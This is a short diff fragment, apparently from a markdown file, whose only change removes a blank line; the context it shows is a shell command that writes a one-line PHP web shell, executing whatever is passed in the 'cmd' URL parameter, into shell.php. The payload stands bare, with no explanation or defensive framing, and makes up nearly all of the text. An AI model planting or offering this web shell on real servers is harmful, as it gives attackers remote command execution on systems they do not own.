@@ -1,4 +1,3 @@
-
 ```shell
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
